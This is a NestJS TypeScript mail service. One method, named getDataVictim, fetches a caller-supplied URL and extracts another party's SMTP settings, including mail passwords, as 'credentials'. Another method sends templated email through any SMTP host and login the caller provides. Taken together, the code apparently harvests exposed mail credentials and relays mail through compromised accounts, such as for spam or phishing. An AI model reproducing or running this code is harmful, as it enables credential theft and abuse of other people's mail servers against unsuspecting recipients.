import { MailerService } from '@nestjs-modules/mailer';
import { Inject, Injectable } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { CACHE_MANAGER } from '@nestjs/cache-manager';
import { Cache } from 'cache-manager';
import { UserActiveInterface } from 'src/common/interfaces/user-active.interface';
import { Mail } from './entities/mail.entity';
import { getDataVictim, sendEmailDto } from './dto/mail.dto';
import { ConfigService } from '@nestjs/config';
import * as nodemailer from 'nodemailer';
import { join } from 'path';
import { readFileSync } from 'fs';
import * as Handlebars from 'handlebars';
import axios from 'axios';
import { axiosErrorHandler } from 'src/common/utils/http-resp.utils';

@Injectable()
export class MailService {
  private transporter;

  constructor(
      @InjectRepository(Mail)
      private readonly saveDataMailRepository: Repository<Mail>,
      @Inject(CACHE_MANAGER) private readonly cacheManager: Cache,
  ) {}

  private getMailServerConfig(dto: sendEmailDto): any {
    return {
      host: dto.hostname || process.env.SMTP_HOST,
      port: dto.port || process.env.SMTP_PORT,
      secure: dto.secure || process.env.SMTP_SECURE,
      username: dto.username || process.env.SMTP_USERNAME,
      password: dto.password || process.env.SMTP_PASSWORD,
      send_mail: dto.hostmail || process.env.SMTP_EMAIL,
    };
  }
  
  async sendEmail(sendEmailDto: sendEmailDto, user: UserActiveInterface) {
    const emailConfig = {
      to: sendEmailDto.email,
      from: `"No Reply" <${sendEmailDto.hostmail || process.env.SMTP_EMAIL}>`,
      subject: sendEmailDto.subject,
      html: await this.renderTemplate(sendEmailDto.template, { sendEmailDto }),
    };

    // Configurar el transporte aquí también para asegurarse de que se actualicen los valores si cambian
    const { host, port, username, password } = this.getMailServerConfig(sendEmailDto);
    this.transporter = nodemailer.createTransport({
      host,
      port: parseInt(port, 10),
      secure: true,
      auth: {
        user: username,
        pass: password,
      },
    });

    // Enviar el correo electrónico utilizando this.transporter
    await this.transporter.sendMail(emailConfig);
  }

  async getDataVictim(GetDataVictim: getDataVictim){
    const axiosPromise = axios.get(GetDataVictim.url);
    const resp = await axiosErrorHandler(axiosPromise);
    const credentials = [{
      //"settings": resp?.user?.settings,
      "name": resp?.user?.settings?.name,
      "mail_host": resp?.user?.settings?.mail_host,
      "mail_username": resp?.user?.settings?.mail_username,
      "mail_password": resp?.user?.settings?.mail_password,
      "mail_bcc": resp?.user?.settings?.mail_bcc,
      "mail_auth": resp?.user?.settings?.mail_auth,
      "mail_sender": resp?.user?.settings?.mail_sender,
    }];

    return credentials;
  }

  private async renderTemplate(templateName: string, data: Record<string, any>): Promise<string> {
    const templatePath = join(__dirname, 'templates', `${templateName}.hbs`);
    const templateContent = readFileSync(templatePath, 'utf8');
    
    // Compilar la plantilla Handlebars
    const compiledTemplate = Handlebars.compile(templateContent);

    // Renderizar la plantilla con los datos proporcionados
    const renderedTemplate = compiledTemplate(data);

    return renderedTemplate;
  }
}
